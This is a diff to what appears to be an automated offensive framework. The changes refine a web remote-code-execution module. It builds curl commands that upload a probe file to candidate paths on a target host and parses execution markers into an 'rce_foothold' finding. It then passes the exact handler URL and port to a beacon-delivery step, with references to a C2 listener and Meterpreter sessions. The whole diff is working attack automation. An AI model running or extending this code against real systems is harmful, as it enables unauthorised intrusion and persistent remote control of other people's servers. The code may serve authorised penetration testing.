@@ -2583,9 +2583,13 @@ def _web_rce_adapter(wm, slots):
     netloc = _hport(target, port)
     segments = []
     for p in paths[:6]:
+        url = f"{scheme}://{netloc}{p}"
+        # Tag the hit with the URL that produced it: beacon_via_rce must
+        # re-use the handler that actually executed, not assume /upload.
         segments.append(
             f"curl -s -k -m 8 -F 'file=@{tmp};filename=probe.py' "
-            f"{scheme}://{netloc}{p} | grep -o '{marker}:[0-9]*' || true")
+            f"{url} | grep -o '{marker}:[0-9]*' | "
+            f"sed 's#^#RCE_HIT:{url}:#' || true")
     probes = _join_local_shell(segments)
     tried = " ".join(f"{scheme}://{netloc}{p}" for p in paths[:6])
     return f"echo 'RCE_PROBE_PATHS: {tried}' ; {probes}"
@@ -2595,14 +2599,28 @@ def _web_rce_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[
     """Interpreter: a PHANTOM_RCE_<n>:<uid> marker proves code execution on
     the box -> rce_foothold finding (usable by beacon_via_rce)."""
     import re
+    from urllib.parse import urlsplit
     findings = []
-    m = re.search(r"(PHANTOM_RCE_\d+):(\d+)", output)
+    hit = re.search(
+        r"RCE_HIT:(https?://\S+?):(PHANTOM_RCE_\d+):(\d+)", output)
+    m = hit or re.search(r"(PHANTOM_RCE_\d+):(\d+)", output)
     if m:
+        value = {"vector": "arbitrary-file-upload",
+                 "uid": m.group(3) if hit else m.group(2)}
+        if hit:
+            url = hit.group(1)
+            parsed = urlsplit(url)
+            value.update({
+                "url": url,
+                "path": parsed.path or "/",
+                "scheme": parsed.scheme or "http",
+                "port": str(parsed.port or (443 if parsed.scheme == "https" else 80)),
+            })
         findings.append(Finding(
             kind="rce_foothold", key="web_upload",
-            value={"vector": "arbitrary-file-upload", "uid": m.group(2)},
+            value=value,
             confidence=0.9, source="web_rce",
-            evidence=output.strip()[:200]))
+            evidence=output.strip()[:300]))
     return findings
 
 
@@ -3019,7 +3037,11 @@ def _pick_rce_candidate(wm: WorldModel) -> Optional[Dict[str, Any]]:
             # reuse the same real-web-app port resolution as the probe
             # (excludes the operator's own C2 listener port)
             _h, port = _web_service_target(wm)
-            return {"channel": "web_upload", "port": port,
+            return {"channel": "web_upload",
+                    "port": str(v.get("port") or port),
+                    "path": v.get("path") or "",
+                    "scheme": v.get("scheme") or "",
+                    "url": v.get("url") or "",
                     "evidence": v.get("evidence") or ""}
         # A foothold verified by a local PoC (channel=poc) or by a real
         # Meterpreter/shell session (channel=msf) is a first-class delivery
